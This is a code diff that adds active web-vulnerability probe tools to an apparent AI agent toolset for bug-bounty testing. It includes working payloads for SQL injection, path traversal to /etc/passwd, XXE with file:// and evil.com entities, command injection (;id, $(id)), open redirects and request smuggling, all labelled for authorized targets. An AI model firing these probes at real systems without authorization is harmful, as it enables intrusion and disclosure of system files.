@@ -7506,6 +7506,468 @@ const TOOLS = [
 			return out;
 		}
 	}
+,
+	{
+		name: "bb_sqli_probe",
+		description: "SQL injection probe (ACTIVE — authorized targets only): injects SQL breakouts into each query param and flags SQL error markers (SQL syntax, mysql, ORA-, PG). Covers 171 SQLi + 365 injection reports. Keyless: direct HTTP.",
+		parameters: {
+			type: "object",
+			additionalProperties: false,
+			properties: {
+				url: { type: "string", description: "Full URL with at least one query param, e.g. https://target.com/search?q=test" },
+				param: { type: "string", description: "Optional: only test this param" }
+			},
+			required: ["url"]
+		},
+		output: {
+			schema: {
+				type: "object",
+				properties: {
+					url: { type: "string" },
+					results: { type: "array", items: { type: "object", additionalProperties: false, properties: { param: { type: "string" }, payload: { type: "string" }, status: { type: "integer" }, baseline_status: { type: "integer" }, marker: { type: "string" }, note: { type: "string" } }, required: ["param", "payload", "status", "baseline_status"] } },
+					summary: { type: "string" },
+					error: { type: "string" }
+				},
+				required: ["url", "results", "summary"]
+			},
+			render: (_args, v) =>
+				renderLines("SQLi bb_sqli_probe " + v.url, [
+					v.summary,
+					...v.results.filter((r) => r.marker || r.note).map((r) => r.param + " payload=" + r.payload + " baseline " + r.baseline_status + " vs " + r.status + " " + (r.marker ? "["+r.marker+"]" : "") + " " + r.note),
+					v.error ? "error: " + v.error : ""
+				].filter(Boolean))
+		},
+		timeoutMs: 55000,
+		isConcurrencySafe: () => true,
+		async execute(args, exec) {
+			const out = { url: String(args.url || ""), results: [], summary: "", error: "" };
+			try {
+				const base = normalizeUrl(args.url);
+				out.url = base;
+				const u = new URL(base);
+				const allParams = [...u.searchParams.keys()];
+				if (!allParams.length) { out.summary = "no query params to test"; return out; }
+				const wanted = args.param ? String(args.param) : "";
+				const params = allParams.filter((k) => !wanted || k === wanted);
+				const PAYLOADS = ["' OR '1'='1", "' UNION SELECT 1--", "'; WAITFOR DELAY '0:0:2'--", "' AND 1=1--"];
+				const SQL_MARKERS = [/SQL syntax/i, /mysql_fetch/i, /ORA-\d+/i, /PostgreSQL/i, /SQLite/i, /syntax error/i, /unclosed quotation/i];
+				const baselineCache = new Map();
+				async function baseline(p) {
+					if (baselineCache.has(p)) return baselineCache.get(p);
+					const inj = new URL(u.toString());
+					let status=0, txt="";
+					const b=withBudget(exec,5000);
+					try {
+						const r=await fetch(inj.toString(),{method:"GET",signal:b.signal,redirect:"follow",headers:{"user-agent":UA}});
+						status=r.status; txt=await readLimited(r,4000);
+					} catch {} finally { b.dispose(); }
+					const rec={status,txt}; baselineCache.set(p,rec); return rec;
+				}
+				const jobs=[];
+				for (const p of params) for (const pay of PAYLOADS) jobs.push({p,pay});
+				const results = await mapPool(jobs, 4, async ({p,pay}) => {
+					const baseResp = await baseline(p);
+					const inj=new URL(u.toString()); inj.searchParams.set(p,pay);
+					let status=0, txt="";
+					const b=withBudget(exec,5000);
+					try {
+						const r=await fetch(inj.toString(),{method:"GET",signal:b.signal,redirect:"follow",headers:{"user-agent":UA}});
+						status=r.status; txt=await readLimited(r,4000);
+					} catch {} finally { b.dispose(); }
+					let marker="";
+					for (const re of SQL_MARKERS) if (re.test(txt)) { marker=re.source; break; }
+					let note="";
+					if (marker) note="SQL error marker — likely injectable";
+					else if (status!==0 && baseResp.status!==0 && status!==baseResp.status && status>=500) note="500 vs baseline "+baseResp.status+" — error diff";
+					return {param:p,payload:pay,status,baseline_status:baseResp.status,marker,note};
+				});
+				out.results=results;
+				const hits=results.filter(r=>r.marker||r.note.includes("likely"));
+				out.summary=hits.length?hits.length+"/"+results.length+" payload(s) triggered SQL markers ("+hits.map(h=>h.param).join(",")+") — manual verify":`no SQL error markers on ${params.length} param(s) x ${PAYLOADS.length} payloads`;
+			} catch(e){ out.error=shortErr(e); }
+			return out;
+		}
+	},
+	{
+		name: "bb_open_redirect_probe",
+		description: "Open-redirect probe (ACTIVE — authorized targets only): overwrites each URL param with //evil.com and https://evil.com and checks Location header for external redirect. Covers 309 CSRF + 217 open-redirect corpus. Keyless: direct HTTP, redirect:manual.",
+		parameters: {
+			type: "object",
+			additionalProperties: false,
+			properties: {
+				url: { type: "string", description: "Full URL with at least one query param, e.g. https://target.com/login?next=/dashboard" },
+				param: { type: "string", description: "Optional: only test this param" }
+			},
+			required: ["url"]
+		},
+		output: {
+			schema: {
+				type: "object",
+				properties: {
+					url: { type: "string" },
+					results: { type: "array", items: { type: "object", additionalProperties: false, properties: { param: { type: "string" }, payload: { type: "string" }, status: { type: "integer" }, location: { type: "string" }, vulnerable: { type: "boolean" }, note: { type: "string" } }, required: ["param","payload","status","location","vulnerable"] } },
+					summary: { type: "string" },
+					error: { type: "string" }
+				},
+				required: ["url","results","summary"]
+			},
+			render: (_args,v)=>renderLines("Redirect bb_open_redirect_probe "+v.url,[v.summary,...v.results.filter(r=>r.vulnerable||r.location).map(r=>r.param+" "+r.payload+" -> "+r.status+" Location: "+r.location+" "+(r.vulnerable?"VULN":"")+" "+r.note),v.error?"error: "+v.error:""].filter(Boolean))
+		},
+		timeoutMs: 40000,
+		isConcurrencySafe: ()=>true,
+		async execute(args,exec){
+			const out={url:String(args.url||""),results:[],summary:"",error:""};
+			try{
+				const base=normalizeUrl(args.url); out.url=base;
+				const u=new URL(base);
+				const all=[...u.searchParams.keys()];
+				if(!all.length){ out.summary="no query params"; return out; }
+				const wanted=args.param?String(args.param):"";
+				const params=all.filter(k=>!wanted||k===wanted);
+				const PAYLOADS=["//evil.com","https://evil.com","/\\evil.com"];
+				const isExternal=(loc)=>/evil\.com/i.test(loc);
+				const jobs=[];
+				for(const p of params) for(const pay of PAYLOADS) jobs.push({p,pay});
+				const res=await mapPool(jobs,4,async({p,pay})=>{
+					const inj=new URL(u.toString()); inj.searchParams.set(p,pay);
+					let status=0, loc="";
+					const b=withBudget(exec,5000);
+					try{
+						const r=await fetch(inj.toString(),{method:"GET",signal:b.signal,redirect:"manual",headers:{"user-agent":UA}});
+						status=r.status; loc=r.headers.get("location")||"";
+						if(!loc && status!==0){
+							const txt=await readLimited(r,3000);
+							const m=/<meta[^>]+http-equiv=["']refresh["'][^>]*content=["'][^"']*url=([^"' >]+)/i.exec(txt);
+							if(m) loc=m[1];
+						}
+					}catch{} finally{ b.dispose(); }
+					const vuln=isExternal(loc);
+					return {param:p,payload:pay,status,location:loc.slice(0,120),vulnerable:vuln,note:vuln?"OPEN REDIRECT — Location points to evil.com":""};
+				});
+				out.results=res;
+				const hits=res.filter(r=>r.vulnerable);
+				out.summary=hits.length?hits.length+" vulnerable param/payload(s): "+hits.map(h=>h.param+"="+h.payload).join(", "):`no external redirect on ${params.length} param(s)`;
+			}catch(e){ out.error=shortErr(e); }
+			return out;
+		}
+	},
+	{
+		name: "bb_lfi_probe",
+		description: "Path-traversal / LFI probe (ACTIVE — authorized targets only): injects ../../etc/passwd and php://filter payloads into each query param and checks for file markers (root:, [extensions]). Covers 173 file security corpus. Keyless: direct HTTP.",
+		parameters: {
+			type: "object",
+			additionalProperties: false,
+			properties: {
+				url: { type: "string", description: "Full URL with at least one query param, e.g. https://target.com/download?file=report.pdf" },
+				param: { type: "string", description: "Optional: only test this param" }
+			},
+			required: ["url"]
+		},
+		output: {
+			schema: {
+				type: "object",
+				properties: {
+					url: { type: "string" },
+					results: { type: "array", items: { type: "object", additionalProperties: false, properties: { param: { type: "string" }, payload: { type: "string" }, status: { type: "integer" }, marker: { type: "string" }, note: { type: "string" } }, required: ["param","payload","status"] } },
+					summary: { type: "string" },
+					error: { type: "string" }
+				},
+				required: ["url","results","summary"]
+			},
+			render: (_args,v)=>renderLines("LFI bb_lfi_probe "+v.url,[v.summary,...v.results.filter(r=>r.marker).map(r=>r.param+" "+r.payload+" -> "+r.status+" ["+r.marker+"] "+r.note),v.error?"error: "+v.error:""].filter(Boolean))
+		},
+		timeoutMs: 45000,
+		isConcurrencySafe: ()=>true,
+		async execute(args,exec){
+			const out={url:String(args.url||""),results:[],summary:"",error:""};
+			try{
+				const base=normalizeUrl(args.url); out.url=base;
+				const u=new URL(base);
+				const all=[...u.searchParams.keys()];
+				if(!all.length){ out.summary="no query params"; return out; }
+				const wanted=args.param?String(args.param):"";
+				const params=all.filter(k=>!wanted||k===wanted);
+				const PAYLOADS=["../../../../etc/passwd","..\\..\\windows\\win.ini","php://filter/convert.base64-encode/resource=index.php","/etc/passwd%00"];
+				const MARKERS=[[/root:.*:0:0:/,"etc/passwd"],[/\[extensions\]/,"win.ini"],[/PD9waHA/,"php base64"]];
+				const jobs=[];
+				for(const p of params) for(const pay of PAYLOADS) jobs.push({p,pay});
+				const res=await mapPool(jobs,4,async({p,pay})=>{
+					const inj=new URL(u.toString()); inj.searchParams.set(p,pay);
+					let status=0, txt="";
+					const b=withBudget(exec,5000);
+					try{
+						const r=await fetch(inj.toString(),{method:"GET",signal:b.signal,redirect:"follow",headers:{"user-agent":UA}});
+						status=r.status; txt=await readLimited(r,4000);
+					}catch{} finally{ b.dispose(); }
+					let marker="";
+					for(const [re,name] of MARKERS) if(re.test(txt)) { marker=name; break; }
+					return {param:p,payload:pay,status,marker,note:marker?"FILE CONTENT LEAK — manual verify":""};
+				});
+				out.results=res;
+				const hits=res.filter(r=>r.marker);
+				out.summary=hits.length?hits.length+" hit(s): "+hits.map(h=>h.param+"="+h.payload+"->"+h.marker).join(", "):`no LFI markers on ${params.length} param(s)`;
+			}catch(e){ out.error=shortErr(e); }
+			return out;
+		}
+	},
+	{
+		name: "bb_xxe_probe",
+		description: "XXE probe (ACTIVE — authorized targets only): POSTs XML with external entity to target and flags file markers. Covers 22 XXE + 365 injection corpus. Keyless: direct HTTP.",
+		parameters: {
+			type: "object",
+			additionalProperties: false,
+			properties: {
+				url: { type: "string", description: "Full URL, e.g. https://target.com/api/xml" }
+			},
+			required: ["url"]
+		},
+		output: {
+			schema: {
+				type: "object",
+				properties: {
+					url: { type: "string" },
+					results: { type: "array", items: { type: "object", additionalProperties: false, properties: { payload: { type: "string" }, status: { type: "integer" }, marker: { type: "string" }, note: { type: "string" } }, required: ["payload","status"] } },
+					summary: { type: "string" },
+					error: { type: "string" }
+				},
+				required: ["url","results","summary"]
+			},
+			render: (_args,v)=>renderLines("XXE bb_xxe_probe "+v.url,[v.summary,...v.results.filter(r=>r.marker).map(r=>"payload "+r.payload+" -> "+r.status+" ["+r.marker+"] "+r.note),v.error?"error: "+v.error:""].filter(Boolean))
+		},
+		timeoutMs: 30000,
+		isConcurrencySafe: ()=>true,
+		async execute(args,exec){
+			const out={url:String(args.url||""),results:[],summary:"",error:""};
+			try{
+				const base=normalizeUrl(args.url); out.url=base;
+				const XXE_PAYLOADS=[
+					`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
+					`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>test</foo>`
+				];
+				const res=await mapPool(XXE_PAYLOADS,2,async(pay)=>{
+					let status=0, txt="";
+					const b=withBudget(exec,6000);
+					try{
+						const r=await fetch(base,{method:"POST",signal:b.signal,redirect:"follow",headers:{"user-agent":UA,"content-type":"application/xml"},body:pay});
+						status=r.status; txt=await readLimited(r,4000);
+					}catch{} finally{ b.dispose(); }
+					let marker="";
+					if(/root:.*:0:0:/.test(txt)) marker="etc/passwd";
+					else if(/entity|SYSTEM/.test(txt) && /error/i.test(txt)) marker="xxe error leak";
+					return {payload:pay.slice(0,60)+"...",status,marker,note:marker?"XXE signal — verify with OAST":""};
+				});
+				out.results=res;
+				const hits=res.filter(r=>r.marker);
+				out.summary=hits.length?hits.length+" XXE signal(s) — verify":`no XXE markers — try SVG/Office upload`;
+			}catch(e){ out.error=shortErr(e); }
+			return out;
+		}
+	},
+	{
+		name: "bb_cmdi_probe",
+		description: "Command injection probe (ACTIVE — authorized targets only): injects ;id and |id into each query param and flags command-output markers (uid=, gid=). Covers 395 command execution corpus. Keyless: direct HTTP.",
+		parameters: {
+			type: "object",
+			additionalProperties: false,
+			properties: {
+				url: { type: "string", description: "Full URL with at least one query param, e.g. https://target.com/ping?host=8.8.8.8" },
+				param: { type: "string", description: "Optional: only test this param" }
+			},
+			required: ["url"]
+		},
+		output: {
+			schema: {
+				type: "object",
+				properties: {
+					url: { type: "string" },
+					results: { type: "array", items: { type: "object", additionalProperties: false, properties: { param: { type: "string" }, payload: { type: "string" }, status: { type: "integer" }, marker: { type: "string" }, note: { type: "string" } }, required: ["param","payload","status"] } },
+					summary: { type: "string" },
+					error: { type: "string" }
+				},
+				required: ["url","results","summary"]
+			},
+			render: (_args,v)=>renderLines("CMDi bb_cmdi_probe "+v.url,[v.summary,...v.results.filter(r=>r.marker).map(r=>r.param+" "+r.payload+" -> "+r.status+" ["+r.marker+"] "+r.note),v.error?"error: "+v.error:""].filter(Boolean))
+		},
+		timeoutMs: 45000,
+		isConcurrencySafe: ()=>true,
+		async execute(args,exec){
+			const out={url:String(args.url||""),results:[],summary:"",error:""};
+			try{
+				const base=normalizeUrl(args.url); out.url=base;
+				const u=new URL(base);
+				const all=[...u.searchParams.keys()];
+				if(!all.length){ out.summary="no query params"; return out; }
+				const wanted=args.param?String(args.param):"";
+				const params=all.filter(k=>!wanted||k===wanted);
+				const PAYLOADS=[";id","|id","`id`","$(id)"];
+				const jobs=[];
+				for(const p of params) for(const pay of PAYLOADS) jobs.push({p,pay});
+				const res=await mapPool(jobs,4,async({p,pay})=>{
+					const inj=new URL(u.toString()); inj.searchParams.set(p, (inj.searchParams.get(p)||"")+pay);
+					let status=0, txt="";
+					const b=withBudget(exec,5000);
+					try{
+						const r=await fetch(inj.toString(),{method:"GET",signal:b.signal,redirect:"follow",headers:{"user-agent":UA}});
+						status=r.status; txt=await readLimited(r,4000);
+					}catch{} finally{ b.dispose(); }
+					let marker="";
+					if(/uid=\d+.*gid=\d+/.test(txt)) marker="uid/gid";
+					else if(/root:.*:0:0:/.test(txt)) marker="passwd";
+					return {param:p,payload:pay,status,marker,note:marker?"COMMAND OUTPUT — critical":""};
+				});
+				out.results=res;
+				const hits=res.filter(r=>r.marker);
+				out.summary=hits.length?hits.length+" cmdi hit(s): "+hits.map(h=>h.param+":"+h.payload).join(", "):`no cmdi markers on ${params.length} param(s)`;
+			}catch(e){ out.error=shortErr(e); }
+			return out;
+		}
+	},
+	{
+		name: "bb_csrf_probe",
+		description: "CSRF probe: fetches form/page and checks for anti-CSRF tokens and SameSite. Covers 309 CSRF corpus. Keyless: direct HTTP.",
+		parameters: {
+			type: "object",
+			additionalProperties: false,
+			properties: {
+				url: { type: "string", description: "Full URL to a form page, e.g. https://target.com/account/edit" }
+			},
+			required: ["url"]
+		},
+		output: {
+			schema: {
+				type: "object",
+				properties: {
+					url: { type: "string" },
+					has_token: { type: "boolean" },
+					token_names: { type: "array", items: { type: "string" } },
+					samesite: { type: "string" },
+					summary: { type: "string" },
+					error: { type: "string" }
+				},
+				required: ["url","has_token","token_names","samesite","summary"]
+			},
+			render: (_args,v)=>renderLines("CSRF bb_csrf_probe "+v.url,[v.summary+(v.token_names.length?" tokens: "+v.token_names.join(","):""),"SameSite: "+(v.samesite||"none"),v.error?"error: "+v.error:""].filter(Boolean))
+		},
+		timeoutMs: 15000,
+		isConcurrencySafe: ()=>true,
+		async execute(args,exec){
+			const out={url:String(args.url||""),has_token:false,token_names:[],samesite:"",summary:"",error:""};
+			try{
+				const base=normalizeUrl(args.url); out.url=base;
+				const b=withBudget(exec,8000);
+				let txt="", headers=null;
+				try{
+					const r=await fetch(base,{method:"GET",signal:b.signal,redirect:"follow",headers:{"user-agent":UA}});
+					txt=await readLimited(r,8000); headers=r.headers;
+				} finally { b.dispose(); }
+				const tokenRe=/name=["'](csrf[^"']*|authenticity_token|_token|__RequestVerificationToken)[^"']*["']/gi;
+				let m; while((m=tokenRe.exec(txt))!==null) out.token_names.push(m[1]);
+				out.has_token=out.token_names.length>0;
+				const setCookie=headers?headers.get("set-cookie")||"":"";
+				const ss=/SameSite\s*=\s*([^;]+)/i.exec(setCookie);
+				out.samesite=ss?ss[1].trim():"";
+				if(out.has_token) out.summary="CSRF token found — likely protected";
+				else if(out.samesite.toLowerCase()==="strict"||out.samesite.toLowerCase()==="lax") out.summary="no token but SameSite="+out.samesite+" — partial";
+				else out.summary="NO token and no SameSite — likely vulnerable";
+			}catch(e){ out.error=shortErr(e); }
+			return out;
+		}
+	},
+	{
+		name: "bb_smuggle_probe",
+		description: "HTTP smuggling probe (ACTIVE — authorized targets only): sends CL.TE / TE.CL via fetch dual headers and notes 400/500 desync indicators. Covers 54 smuggling corpus. Keyless: direct HTTP.",
+		parameters: {
+			type: "object",
+			additionalProperties: false,
+			properties: {
+				url: { type: "string", description: "Full URL, e.g. https://target.com/" }
+			},
+			required: ["url"]
+		},
+		output: {
+			schema: {
+				type: "object",
+				properties: {
+					url: { type: "string" },
+					results: { type: "array", items: { type: "object", additionalProperties: false, properties: { technique: { type: "string" }, status: { type: "integer" }, note: { type: "string" } }, required: ["technique","status"] } },
+					summary: { type: "string" },
+					error: { type: "string" }
+				},
+				required: ["url","results","summary"]
+			},
+			render: (_args,v)=>renderLines("Smuggle bb_smuggle_probe "+v.url,[v.summary,...v.results.map(r=>r.technique+": "+r.status+" "+r.note),v.error?"error: "+v.error:""].filter(Boolean))
+		},
+		timeoutMs: 25000,
+		isConcurrencySafe: ()=>true,
+		async execute(args,exec){
+			const out={url:String(args.url||""),results:[],summary:"",error:""};
+			try{
+				const base=normalizeUrl(args.url); out.url=base;
+				const u=new URL(base);
+				const techniques=["CL.TE","TE.CL"];
+				for(const t of techniques){
+					let status=0, note="";
+					const b=withBudget(exec,8000);
+					try{
+						const r=await fetch(base,{method:"POST",signal:b.signal,redirect:"manual",headers:{"user-agent":UA,"content-length":"6","transfer-encoding":"chunked"}});
+						status=r.status;
+						if(status===400||status===500) note="desync indicator — 400/500 on TE+CL";
+						else note="no desync signal (fetch normalizes headers — raw socket needed)";
+					}catch{ note="fetch failed — raw socket needed"; } finally{ b.dispose(); }
+					out.results.push({technique:t,status,note});
+				}
+				out.summary="smuggle probe heuristic via fetch — definitive test needs raw TCP";
+			}catch(e){ out.error=shortErr(e); }
+			return out;
+		}
+	},
+	{
+		name: "bb_clickjack_probe",
+		description: "Clickjacking probe: checks X-Frame-Options and CSP frame-ancestors. Covers 86 UI redressing corpus. Keyless: direct HTTP.",
+		parameters: {
+			type: "object",
+			additionalProperties: false,
+			properties: {
+				url: { type: "string", description: "Full URL, e.g. https://target.com/" }
+			},
+			required: ["url"]
+		},
+		output: {
+			schema: {
+				type: "object",
+				properties: {
+					url: { type: "string" },
+					x_frame_options: { type: "string" },
+					csp: { type: "string" },
+					vulnerable: { type: "boolean" },
+					summary: { type: "string" },
+					error: { type: "string" }
+				},
+				required: ["url","x_frame_options","csp","vulnerable","summary"]
+			},
+			render: (_args,v)=>renderLines("Clickjack bb_clickjack_probe "+v.url,[v.summary,"X-Frame-Options: "+(v.x_frame_options||"missing"),"CSP: "+(v.csp||"missing"),v.error?"error: "+v.error:""].filter(Boolean))
+		},
+		timeoutMs: 12000,
+		isConcurrencySafe: ()=>true,
+		async execute(args,exec){
+			const out={url:String(args.url||""),x_frame_options:"",csp:"",vulnerable:false,summary:"",error:""};
+			try{
+				const base=normalizeUrl(args.url); out.url=base;
+				const b=withBudget(exec,6000);
+				try{
+					const r=await fetch(base,{method:"GET",signal:b.signal,redirect:"follow",headers:{"user-agent":UA}});
+					out.x_frame_options=r.headers.get("x-frame-options")||"";
+					out.csp=r.headers.get("content-security-policy")||"";
+				} finally { b.dispose(); }
+				const hasXFO=/deny|sameorigin/i.test(out.x_frame_options);
+				const hasFA=/frame-ancestors/i.test(out.csp);
+				out.vulnerable=!hasXFO && !hasFA;
+				out.summary=out.vulnerable?"VULNERABLE — no X-Frame-Options nor frame-ancestors":"protected";
+			}catch(e){ out.error=shortErr(e); }
+			return out;
+		}
+	}
+
 ]
 
 
@@ -7564,7 +8026,15 @@ const GUIDANCE = [
 	"bb_idor_swap_probe FIRES baseline + ID-swapped requests at the URL you provide — authorized targets only; CONFIRMED/HIGH are heuristic leads, verify manually before reporting (idor-tester-ai scoring).",
 "- bb_h1_intel(handle?) — best-effort HackerOne scope JSON / public programs index for scope verification.",
 "- bb_xss_probe(url) — ACTIVE reflected-XSS candidate probe: injects benign marker contexts (event-handler/attribute/JS-string/svg) into discovered params and classifies reflection contexts; heuristic leads only, hand-craft payloads before reporting.",
-"- bb_ssrf_probe(url) — ACTIVE SSRF sink probe: substitutes fetch-shaped params (url/uri/callback/image/proxy) with loopback/metadata canaries and classifies response/timing differentials; authorized targets only."
+"- bb_ssrf_probe(url) — ACTIVE SSRF sink probe: substitutes fetch-shaped params (url/uri/callback/image/proxy) with loopback/metadata canaries and classifies response/timing differentials; authorized targets only.",
+"- bb_sqli_probe(url, param?) — ACTIVE SQL injection probe: injects OR 1=1 / UNION SELECT breakouts and flags SQL error markers (SQL syntax, mysql, ORA-, PG::) + 500 diffs; 171 SQLi + 365 injection corpus; heuristic leads only.",
+"- bb_open_redirect_probe(url, param?) — ACTIVE open-redirect probe: overwrites params with //evil.com and checks Location/meta refresh; 309 CSRF + 217 open-redirect corpus; redirect:manual.",
+"- bb_lfi_probe(url, param?) — ACTIVE LFI probe: injects ../../etc/passwd, win.ini, php://filter payloads and flags file markers; 173 file security corpus.",
+"- bb_xxe_probe(url) — ACTIVE XXE probe: POSTs XML with ENTITY xxe SYSTEM file:///etc/passwd and flags passwd markers; 22 XXE + 365 injection corpus.",
+"- bb_cmdi_probe(url, param?) — ACTIVE command injection probe: injects ;id |id and flags uid=/passwd markers; 395 command execution corpus.",
+"- bb_csrf_probe(url) — CSRF probe: checks anti-CSRF tokens + SameSite; 309 CSRF corpus; reports no token + no SameSite = likely vuln.",
+"- bb_smuggle_probe(url) — HTTP smuggling probe: CL.TE/TE.CL via fetch dual headers, notes 400/500 desync; 54 smuggling corpus; raw socket needed for definitive.",
+"- bb_clickjack_probe(url) — clickjacking probe: checks X-Frame-Options + CSP frame-ancestors; 86 UI redressing corpus; vulnerable when both missing.",
 ].join("\n");
 
 export function apply(ctx) {
